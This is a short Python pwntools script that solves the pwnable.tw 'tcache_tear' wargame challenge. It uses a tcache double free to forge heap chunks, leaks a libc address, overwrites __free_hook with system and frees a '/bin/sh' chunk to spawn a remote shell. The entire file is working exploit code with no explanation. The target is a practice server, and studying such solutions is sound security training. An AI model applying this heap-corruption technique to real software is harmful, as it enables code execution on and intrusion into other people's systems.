from pwn import *

def add(size,note):
    p.sendlineafter(b":","1")
    p.sendlineafter(b":",str(size).encode())
    p.sendafter(b":",note)

def delete():
    p.sendlineafter(b":",b"2")



#context.log_level="debug"
#p=process("./tcache_tear",env = {'LD_PRELOAD' : './libc.so'})
p=remote("chall.pwnable.tw",10207)
libc=ELF("./libc.so")
p.sendlineafter(b"Name:",b"kirin")

#leak libc
add(0x70,b"kirin\n")
delete()
delete()
add(0x70,p64(0x602550))
add(0x70,b"kirin\n")
add(0x70,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
add(0x60,b"kirin\n")
delete()
delete()
add(0x60,p64(0x602050))
add(0x60,b"kirin\n")
add(0x60,p64(0)+p64(0x501)+p64(0)*5+p64(0x602060))
delete()
p.sendlineafter(b":",b"3")
p.recvuntil(b"Name :")
libc_addr=u64(p.recv(8))-0x3ebca0
log.info(hex(libc_addr))

#write free_hook
free_hook=libc_addr+libc.symbols['__free_hook']
system_addr=libc_addr+libc.symbols['system']
add(0x40,b"kirin\n")
delete()
delete()
add(0x40,p64(free_hook))
add(0x40,b"kirin\n")
add(0x40,p64(system_addr))

#get_shell
add(0x18,b"/bin/sh\x00")
delete()
p.interactive()
